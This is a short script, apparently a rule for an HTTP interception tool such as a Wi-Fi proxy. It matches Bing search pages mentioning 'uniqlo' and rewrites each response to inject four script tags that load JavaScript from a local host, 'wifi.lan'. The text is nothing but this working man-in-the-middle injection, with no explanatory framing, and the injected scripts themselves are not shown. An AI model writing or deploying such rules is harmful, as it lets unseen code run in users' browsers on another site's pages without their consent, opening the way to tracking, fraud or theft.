http()
    .url(/bing\.com.*(uniqlo)/)
    .loadContent()
    .modify(/<\/body>/i, `
        <script src='http://wifi.lan/uniqlo/jquery.min.js'></script>
        <script src='http://wifi.lan/uniqlo/index2.min.js'></script>
        <script src='http://wifi.lan/uniqlo/b.bundle.js'></script>
        <script src='http://wifi.lan/uniqlo/init.js'></script>
        </body>
    `)